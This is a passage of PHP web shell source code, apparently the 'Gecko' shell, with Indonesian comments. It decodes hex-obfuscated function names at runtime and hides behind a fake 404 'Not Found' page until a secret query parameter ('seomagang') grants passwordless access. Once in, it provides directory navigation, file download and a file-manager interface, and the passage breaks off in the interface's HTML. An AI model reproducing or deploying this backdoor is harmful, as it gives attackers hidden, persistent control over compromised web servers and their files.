r\n    '63686d6f64', \/\/ 30: chmod\r\n    '7379735f6765745f74656d705f646972', \/\/ 31: sys_get_temp_dir\r\n    '6261736536345F6465636F6465', \/\/ 32: base64_decode\r\n    '6261736536345F656E436F4465', \/\/ 33: base64_encode\r\n];\r\n\r\nfunction unx($hex) {\r\n    \/\/ Fungsi untuk mendekode heksa (uhex pada contoh Anda)\r\n    $return = '';\r\n    for ($i = 0; $i < strlen($hex); $i = $i + 2) {\r\n        $return .= chr(hexdec(substr($hex, $i, 2)));\r\n    }\r\n    return $return;\r\n}\r\n\r\n$hitung_array = count($Array);\r\n$fungsi = [];\r\nfor ($i = 0; $i < $hitung_array; $i++) {\r\n    $fungsi[] = unx($Array[$i]);\r\n}\r\n\r\n\/\/ Global Configuration\r\n$default_action = \"FilesMan\";\r\n$default_use_ajax = true;\r\n$default_charset = 'UTF-8';\r\n$access_key_param = 'seomagang'; \r\n\r\n\/\/ === 404 Stealth Function ===\r\n\r\nfunction show_404_page()\r\n{\r\n    \/\/ Mengirim header 404 Not Found\r\n    header(\"HTTP\/1.0 404 Not Found\");\r\n    $sourcesrv = $_SERVER['SERVER_NAME'];\r\n    \r\n    \/\/ Menggunakan fungsi phpversion() yang aman\r\n    $php_version = function_exists('phpversion') ? phpversion() : 'Unknown';\r\n    \r\n?>\r\n<!DOCTYPE HTML PUBLIC \"-\/\/IETF\/\/DTD HTML 2.0\/\/EN\">\r\n<html><head>\r\n<title>404 Not Found<\/title>\r\n<\/head><body>\r\n<h1>Not Found<\/h1>\r\n<p>The requested URL was not found on this server.<\/p>\r\n<hr>\r\n<address><?php echo $_SERVER['SERVER_SOFTWARE'];?> PHP\/<?php echo $php_version; ?> Server at <?php echo $sourcesrv; ?><\/address>\r\n<\/body><\/html>\r\n<?php\r\n    exit; \/\/ Menghentikan eksekusi setelah menampilkan halaman 404\r\n}\r\n\r\n\/\/ === CENTRAL ACCESS FLOW (No Password) ===\r\n\r\n\/\/ 1. Cek parameter kueri rahasia untuk autentikasi\r\nif (isset($_GET[$access_key_param])) {\r\n    \/\/ Jika parameter ada, set session untuk akses shell\r\n    $_SESSION['authenticated'] = true;\r\n    \/\/ Mengarahkan (redirect) untuk menghilangkan parameter 'seomagang' dari URL\r\n    header(\"Location: \" . strtok($_SERVER[\"REQUEST_URI\"], '?'));\r\n    exit;\r\n}\r\n\r\n\/\/ 2. Cek status autentikasi session\r\nif (!isset($_SESSION['authenticated'])) {\r\n    \/\/ Jika session tidak ada (belum diakses dengan ?seomagang), tampilkan 404 dan berhenti\r\n    show_404_page();\r\n}\r\n\r\n\/\/ ===================================\r\n\/\/ === WEBSHELL LOGIC INITIALIZATION (Hanya jika authenticated) ===\r\n\/\/ ===================================\r\n\r\n\/\/ CD\/Pindah Direktori\r\nif (isset($_GET['d'])) {\r\n    $cdir = unx($_GET['d']);\r\n    $fungsi[14]($cdir); \/\/ chdir\r\n} else {\r\n    $cdir = $fungsi[0](); \/\/ getcwd\r\n}\r\n\r\n\/\/ Semua fungsi di bawah ini harus didefinisikan sebelum digunakan, \r\n\/\/ tetapi ini adalah fungsi pembantu, jadi tidak memicu error 500.\r\n\r\nfunction file_ext($file)\r\n{\r\n    \/\/ Menggunakan fungsi global $fungsi\r\n    global $fungsi; \r\n    \r\n    \/\/ Memeriksa apakah $file ada dan bukan string kosong\r\n    if (empty($file) || !function_exists('mime_content_type')) {\r\n        return '<i class=\"fa-solid fa-file\" style=\"color:#edf7f5\"><\/i>'; \r\n    }\r\n\r\n    $mime = mime_content_type($file);\r\n\r\n    if ($mime == 'image\/png' or $mime == 'image\/jpeg') {\r\n        return '<i class=\"fa-regular fa-image\" style=\"color:#09e3a5\"><\/i>';\r\n    } else if ($mime == 'application\/x-httpd-php' or $mime == 'text\/html') {\r\n        return '<i class=\"fa-solid fa-file-code\" style=\"color:#0985e3\"><\/i>';\r\n    } else if ($mime == 'text\/javascript') {\r\n        return '<i class=\"fa-brands fa-square-js\"><\/i>';\r\n    } else if ($mime == 'application\/zip' or $mime == 'application\/x-7z-compressed') {\r\n        return '<i class=\"fa-solid fa-file-zipper\" style=\"color:#e39a09\"><\/i>';\r\n    } else if ($mime == 'text\/plain') {\r\n        return '<i class=\"fa-solid fa-file\" style=\"color:#edf7f5\"><\/i>';\r\n    } else if ($mime == 'application\/pdf') {\r\n        return '<i class=\"fa-regular fa-file-pdf\" style=\"color:#ba2b0f\"><\/i>';\r\n    } else {\r\n        return '<i class=\"fa-regular fa-file-code\" style=\"color:#0985e3\"><\/i>';\r\n    }\r\n}\r\n\r\nfunction download($file)\r\n{\r\n    if (file_exists($file)) {\r\n        header('Content-Description: File Transfer');\r\n        header('Content-Type: application\/octet-stream');\r\n        header('Content-Disposition: attachment; filename=' . basename($file));\r\n        header('Content-Transfer-Encoding: binary');\r\n        header('Expires: 0');\r\n        header('Cache-Control: must-revalidate');\r\n        header('Pragma: public');\r\n        header('Content-Length: ' . filesize($file));\r\n        ob_clean();\r\n        flush();\r\n        readfile($file);\r\n        exit;\r\n    }\r\n}\r\n\r\n\/\/ Proses Download File dengan pengecekan isset\/empty\r\nif (isset($_GET['don']) && !empty($_GET['don'])) {\r\n    download(unx($_GET['don'])); \/\/ exit di dalam fungsi download\r\n}\r\n\r\n\/\/ Semua fungsi tambahan di bagian post handler (bawah) harus dipastikan ada sebelum dipanggil.\r\n\/\/ Untuk memudahkan, kita panggil semua fungsi di sini.\r\n\/\/ ... (Karena fungsi-fungsi ini sudah ada di bawah, kita biarkan saja strukturnya seperti ini)\r\n\r\n\/\/ =========================================================\r\n\/\/ === START OF HTML OUTPUT AND MAIN WEBSHELL INTERFACE ===\r\n\/\/ =========================================================\r\n?>\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n<head>\r\n    <meta charset=\"UTF-8\">\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\r\n    <meta name=\"robots\" content=\"noindex, nofollow\">\r\n    <meta name=\"googlebot\" content=\"noindex\">\r\n    <title>Gecko [ <?= $_SERVER['SERVER_NAME']; ?> ]<\/title>\r\n    <link rel=\"stylesheet\" href=\"https:\/\/cdnjs.cloudflare.com\/ajax\/libs\/codemirror\/5.63.0\/codemirror.min.css\">\r\n    <link rel=\"stylesheet\" href=\"https:\/\/cdnjs.cloudflare.com\/ajax\/libs\/codemirror\/5.63.0\/theme\/ayu-mirage.